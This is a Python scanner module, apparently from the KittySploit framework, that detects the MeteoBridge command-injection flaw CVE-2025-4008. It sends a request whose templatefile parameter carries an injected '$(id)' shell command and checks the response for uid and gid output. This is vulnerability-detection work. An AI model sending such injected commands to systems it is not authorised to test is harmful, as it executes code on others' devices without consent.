#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""The Meteobridge web interface let meteobridge administrator manage their weather station data collection and a."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'MeteoBridge <= 6.1 - Remote Code Execution Detection',
        'description': 'The Meteobridge web interface let meteobridge administrator manage their weather station data collection and administer their meteobridge system through a web application written in CGI shell scripts and C.This web interface exposes an endpoint that is vulnerable to command injection.Remote unauthenticated attackers can gain arbitrary command execution with elevated privileges ( root ) on affected devices.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2025', 'meteobridge', 'rce', 'kev', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://forum.meteohub.de/viewtopic.php?t=18687',
            'https://www.onekey.com/resource/security-advisory-remote-command-execution-on-smartbedded-meteobridge-cve-2025-4008',
            'https://nvd.nist.gov/vuln/detail/CVE-2025-4008',
        ],
        'cve': 'CVE-2025-4008',
    }

    def run(self):
        path = '/public/template.cgi?templatefile=$(id)'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('Error: template file', 'uid=', 'gid=',)
        if all(m in body for m in body_all):
            self.set_info(severity='high', reason='MeteoBridge <= 6.1 - Remote Code Execution detected', path=path)
            return True
        return False

